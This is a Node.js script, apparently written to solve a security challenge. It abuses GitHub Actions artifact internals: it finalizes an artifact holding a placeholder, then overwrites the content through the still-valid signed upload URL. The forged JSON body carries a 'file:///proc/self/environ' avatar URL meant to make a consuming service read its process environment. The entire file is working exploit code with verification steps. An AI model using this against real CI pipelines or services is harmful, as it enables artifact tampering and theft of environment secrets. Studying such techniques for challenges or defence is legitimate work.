// Mint a self-referential artifact: the JSON body declares its own download path.
// The artifact id only exists after FinalizeArtifact, so: PUT a fixed-length placeholder,
// finalize (no hash -> nothing to mismatch), then re-PUT the real body at the same length
// using the still-valid upload SAS.
import https from 'node:https';
import { createHash } from 'node:crypto';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids   = getBackendIdsFromToken();
const twirp = internalArtifactTwirpClient({ maxAttempts: 1 });
const RUN   = process.env.GITHUB_RUN_ID;
const REPO  = process.env.GITHUB_REPOSITORY;
const TOKEN = process.env.GH_TOKEN;
const LEN   = 512;                       // fixed body length, so the finalized size stays correct

function req(url, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const r = https.request(url, { method, headers }, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers,
                                    rawHeaders: res.rawHeaders, body: Buffer.concat(chunks) }));
    });
    r.on('error', reject);
    r.setTimeout(25000, () => r.destroy(new Error('timeout')));
    if (body) r.write(body);
    r.end();
  });
}
const hdrHex = (res, want) => {
  for (let i = 0; i < res.rawHeaders.length; i += 2)
    if (res.rawHeaders[i].toLowerCase() === want) return Buffer.from(res.rawHeaders[i + 1], 'latin1').toString('hex');
  return null;
};
const put = (url, body, extra = {}) => req(url, { method: 'PUT', body,
  headers: { 'x-ms-blob-type': 'BlockBlob', 'content-length': String(body.length),
             'x-ms-version': '2021-08-06', ...extra } });

// repo JSON padded to exactly LEN bytes; `pad` absorbs the id's digit count
function buildBody(repository) {
  const doc = {
    full_name: repository,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'repo cassette', stargazers_count: 7, pad: '',
  };
  const base = Buffer.byteLength(JSON.stringify(doc));
  const need = LEN - base;
  if (need < 0) throw new Error(`LEN too small by ${-need}`);
  doc.pad = 'A'.repeat(need);
  const out = Buffer.from(JSON.stringify(doc));
  if (out.length !== LEN) throw new Error(`length ${out.length} != ${LEN}`);
  return out;
}

const name = `cassette-${RUN}`;
const created = await twirp.CreateArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name, version: 7, mimeType: StringValue.create({ value: 'application/json' }),
});
const upload = created.signedUploadUrl;
console.log('MINT ' + JSON.stringify({ step: 'create', ok: created.ok, uploadSp: new URL(upload).searchParams.get('sp') }));

const p1 = await put(upload, Buffer.alloc(LEN, 0x20), { 'x-ms-blob-content-type': 'application/json' });
const fin = await twirp.FinalizeArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId, name, size: String(LEN),
});
const artifactId = String(fin.artifactId);
const repository = `${REPO}/actions/artifacts/${artifactId}/zip`;
const body = buildBody(repository);
const p2 = await put(upload, body, { 'x-ms-blob-content-type': 'application/json' });
console.log('MINT ' + JSON.stringify({ step: 'finalize+reput', placeholderPut: p1.status, artifactId,
                                       repository, rePut: p2.status, bodyLen: body.length }));

// Verify through the exact path the challenge uses
const api = await req(`https://api.github.com/repos/${REPO}/actions/artifacts/${artifactId}/zip`, {
  headers: { accept: 'application/vnd.github.v3+json', authorization: `Bearer ${TOKEN}`, 'user-agent': 'probe' } });
const loc = api.headers.location;
const dl  = await req(loc, { headers: { 'user-agent': 'probe' } });
console.log('MINT ' + JSON.stringify({
  step: 'verify', apiStatus: api.status, blobStatus: dl.status,
  servedTypeHex: hdrHex(dl, 'content-type'),
  servedEncoding: dl.headers['content-encoding'] ?? null,
  downloadedLen: dl.body.length,
  bytesMatch: dl.body.equals(body),
  sha256: createHash('sha256').update(dl.body).digest('hex'),
}));
console.log('REPOSITORY=' + repository);
console.log('BODY_B64=' + body.toString('base64'));
